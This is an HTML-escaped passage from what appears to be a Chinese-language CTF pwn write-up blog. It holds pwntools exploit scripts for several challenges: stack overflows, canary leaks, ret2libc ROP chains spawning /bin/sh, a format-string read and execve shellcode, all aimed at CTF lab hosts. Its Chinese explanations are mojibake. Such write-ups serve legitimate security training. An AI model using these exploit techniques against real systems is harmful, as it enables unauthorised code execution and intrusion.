class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;from LibcSearcher import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(os=&amp;#x27;linux&amp;#x27;,log_level=&amp;#x27;debug&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#p = process(&amp;#x27;./pwn&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p = remote(&amp;#x27;node4.anna.nssctf.cn&amp;#x27;,28316)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf = ELF(&amp;#x27;./littleof&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def debug():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    gdb.attach(p)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    pause()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def get_addr():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	return u64(p.recvuntil(b&amp;#x27;\x7f&amp;#x27;)[-6:].ljust(8, b&amp;#x27;\x00&amp;#x27;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# leak canary&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = b&amp;#x27;a&amp;#x27;*0x49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendafter(b&amp;#x27;overflow?&amp;#x27;, payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.recvuntil(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;canary = u64(p.recv(7).rjust(8, b&amp;#x27;\x00&amp;#x27;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;log.info(&amp;#x27;canary addr is %x&amp;#x27;%canary)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# leak libc_base&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rdi = 0x400863&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ret = 0x40059e&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = b&amp;#x27;a&amp;#x27;*0x48 + p64(canary) + p64(0) + p64(rdi) + p64(elf.got[&amp;#x27;puts&amp;#x27;]) + p64(elf.sym[&amp;#x27;puts&amp;#x27;]) + p64(0x4006e2)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendafter(b&amp;#x27;harder!&amp;#x27;, payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc_base = get_addr() - 0x080aa0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# leak canary&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = b&amp;#x27;a&amp;#x27;*0x49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendafter(b&amp;#x27;overflow?&amp;#x27;, payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.recvuntil(b&amp;#x27;a&amp;#x27;*0x49)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;canary = u64(p.recv(7).rjust(8, b&amp;#x27;\x00&amp;#x27;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;log.info(&amp;#x27;canary addr is %x&amp;#x27;%canary)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# get shell&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;system = libc_base + 0x04f550&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;binsh = libc_base + 0x1b3e1a&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = b&amp;#x27;a&amp;#x27;*0x48 + p64(canary) + p64(0) + p64(ret) + p64(rdi) + p64(binsh) + p64(system)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendafter(b&amp;#x27;harder!&amp;#x27;, payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;hnctf-2022-week1easyoverflow&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#hnctf-2022-week1easyoverflow&#34;&gt;#&lt;/a&gt; [HNCTF 2022 Week1]easyoverflow&lt;/h5&gt;
&lt;p&gt;åˆæ˜¯ä¸€ä¸ªæ ˆä¸ç¨³å®šç›´æ¥ cat flag çš„é¢˜æºä»£ç æ˜¯&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#include&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;int main()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    setbuf(stdin,0);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    setbuf(stdout,0);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    setbuf(stderr,0);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    puts(&amp;quot;Input something&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    char name[30];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    int number=0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    gets(name);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if(number!=0)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        puts(&amp;quot;You win.&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        system(&amp;quot;cat flag&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    return 0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;ä¿æŠ¤å…¨å…³ç›´æ¥è®© name æº¢å‡ºåå³å¯&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=remote(&amp;#x27;1.1.1.1&amp;#x27;,11)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=b&amp;#x27;a&amp;#x27;*50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.send(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;nssctf-2022-spring-recruitr3m4ke&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#nssctf-2022-spring-recruitr3m4ke&#34;&gt;#&lt;/a&gt; [NSSCTF 2022 Spring Recruit]R3m4ke?&lt;/h5&gt;
&lt;p&gt;ä¸€ä¸ªå¾ˆç®€å•è¾¾åˆ° payload çš„é¢˜&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(log_level=&amp;#x27;debug&amp;#x27;,os=&amp;#x27;linux&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=remote(&amp;#x27;node4.anna.nssctf.cn&amp;#x27;,28195)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=b&amp;#x27;a&amp;#x27;*0x28+p64(0x40072C)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendlineafter(&amp;#x27;started&amp;gt;&amp;#x27;,payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;hnctf-2022-week1fmtstrre&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#hnctf-2022-week1fmtstrre&#34;&gt;#&lt;/a&gt; [HNCTF 2022 Week1]fmtstrre&lt;/h5&gt;
&lt;p&gt;å­—ç¬¦ä¸²æº¢å‡ºç›´æ¥æŸ¥çœ‹ name åœ¨ bss é‡Œé¢çš„ä½ç½®ç›´æ¥æ‰“å°±è¡Œæ³¨æ„æ ˆå¹³è¡¡&lt;br /&gt;
 %38$s ç›´æ¥è·å¾— flag&lt;/p&gt;
&lt;h5 id=&#34;gdouctf-2023shellcode&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#gdouctf-2023shellcode&#34;&gt;#&lt;/a&gt; [GDOUCTF 2023]Shellcode&lt;/h5&gt;
&lt;p&gt;read å‚¨å­˜ name åœ¨ bss æ®µä¸Šé¢ï¼Œå¹¶ä¸”å¯ä»¥å†™å…¥ 25 çš„å­—èŠ‚é•¿åº¦ä½†æ˜¯ shellcraft é»˜è®¤ç”Ÿæˆçš„å­—èŠ‚æ•°æ˜¯ 44 ä½é•¿åº¦ï¼Œé‚£æˆ‘ä»¬ç›´æ¥å»ç½‘ä¸Šæ‰¾ä¸€ä¸ªå°äº 25 å­—èŠ‚çš„ shellcode&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(log_level=&amp;#x27;debug&amp;#x27;,os=&amp;#x27;linux&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=remote(&amp;#x27;node4.anna.nssctf.cn&amp;#x27;,28735)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;shellcode=&amp;#x27;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;name=0x6010A0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendlineafter(&amp;#x27;lease.&amp;#x27;,shellcode)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=b&amp;#x27;a&amp;#x27;*(0xA+0x8)+p64(name)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendlineafter(&amp;#x27;start!&amp;#x27;,payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;è¿™ä¸ªé¢˜åº”è¯¥è¿˜èƒ½å¤Ÿ ret2libc ä½†æ˜¯æˆ‘æ‰“å‡ºæ¥æœ‰ç‚¹é—®é¢˜&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;from LibcSearcher import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(log_level=&amp;#x27;debug&amp;#x27;,os=&amp;#x27;linux&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=remote(&amp;#x27;node4.anna.nssctf.cn&amp;#x27;,28010)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rdi_pop=0x4007b3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ret=0x40028e&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf=ELF(&amp;#x27;pw&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;puts_plt=elf.plt[&amp;#x27;puts&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;puts_got=elf.got[&amp;#x27;puts&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;main=0x400687&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendlineafter(&amp;#x27;lease.&amp;#x27;,&amp;#x27;1&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload1=b&amp;#x27;a&amp;#x27;*(0xA+0x8)+p64(rdi_pop)+p64(puts_got)+p64(puts_plt)+p64(main)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendlineafter(&amp;#x27;start!&amp;#x27;,payload1)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;puts_ad=u64(p.recvuntil(b&amp;#x27;\x7f&amp;#x27;)[-6:].ljust(8,b&amp;#x27;\x00&amp;#x27;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;log.info(&amp;#x27;puts_ad is %x&amp;#x27;%puts_ad)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc=LibcSearcher(&amp;#x27;puts&amp;#x27;,puts_ad)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc_base=puts_ad-libc.dump(&amp;#x27;puts&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sys_addr=libc_base+libc.dump(&amp;#x27;system&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;str_bin_sh=libc_base+libc.dump(&amp;#x27;str_bin_sh&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendlineafter(&amp;#x27;lease.&amp;#x27;,&amp;#x27;1&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;log.info(sys_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;log.info(str_bin_sh)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload2=b&amp;#x27;a&amp;#x27;+(0xA+0x8)+p64(ret)+p64(rdi_pop)+p64(str_bin_sh)+p64(sys_addr)+p64(main)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendlineafter(&amp;#x27;start!&amp;#x27;,payload2)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;hnctf-2022-week1ezr0p32&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#hnctf-2022-week1ezr0p32&#34;&gt;#&lt;/a&gt; [HNCTF 2022 Week1]ezr0p32&lt;/h5&gt;
&lt;p&gt;æŠŠ /bin/sh å†™åœ¨.bss ä¸Šç„¶åç›´æ¥æ‰“&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(log_level=&amp;#x27;debug&amp;#x27;,os=&amp;#x27;linux&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=remote(&amp;#x27;node5.anna.nssctf.cn&amp;#x27;,28655)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendlineafter(&amp;#x27;name&amp;#x27;,&amp;#x27;/bin/sh&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=b&amp;#x27;a&amp;#x27;*(0x1c+0x4)+p32(0x080483d0)+p32(0)+p32(0x0804A080)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendlineafter(&amp;#x27;time~&amp;#x27;,payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;æ·±è‚²æ¯-2021find_flag&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#æ·±è‚²æ¯-2021find_flag&#34;&gt;#&lt;/a&gt; [æ·±è‚²æ¯ 2021] find_flag&lt;/h5&gt;
&lt;p&gt;è¿™ä¸ªé¢˜æ¶‰åŠçš„çŸ¥è¯†ç‚¹æœ‰ç‚¹å¤šæ¯•ç«Ÿä¿æŠ¤å…¨å¼€ï¼Œæ‰“å¼€ ida æŸ¥çœ‹åˆ° sub å‡½æ•°é‡Œé¢çš„æœ‰ä¸ªå­—ç¬¦ä¸²æº¢å‡ºå¯ä»¥å¾—åˆ° canary å’ŒåŸºåœ°å€ï¼Œç”¨ gdb å› ä¸ºå¼€å¯äº† ple ä¸èƒ½åœ¨ main å‡½æ•°ä¸Šä¸‹æ–­ç‚¹å°±åªæœ‰ä¸‹åœ¨ printf ä¸Šäº†ç„¶åè°ƒè¯•ä½ å¯ä»¥ç”¨ stack æŸ¥çœ‹åˆ° rbp ä¸Šé¢çš„åœ°å€æ˜¯ ****00 å¯ä»¥çŒœåˆ°è¿™ä¸ªå°±æ˜¯ canary äº†å› ä¸º canary ä¸€èˆ¬æƒ…å†µä¸‹éƒ½æ˜¯ä»¥ 00 ç»“å°¾çš„ï¼Œcanary ä¿æŠ¤ä¸»è¦æ˜¯é€šè¿‡åœ¨æ ˆä¸‹è®¾ç½®ä¸€ä¸ªåœ°å€ï¼Œè¿”å›æ˜¯ä¹Ÿå¿…é¡»å¸¦ä¸Šé‚£ä¸ªåœ°å€ä¸ç„¶å°±ä¼šè§¦å‘ä¿æŠ¤ï¼Œç„¶å ple ä¿æŠ¤çš„è¯ä¸»è¦æ˜¯é€šè¿‡æ¯æ¬¡ä¿®æ”¹.textã€.data çš„åœ°å€ã€‚tipsï¼šä½¿ç”¨ pwngdb å¯ä»¥åˆ©ç”¨ fmtarg æ¥å¾—åˆ°æ ˆåç§»é‡&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span 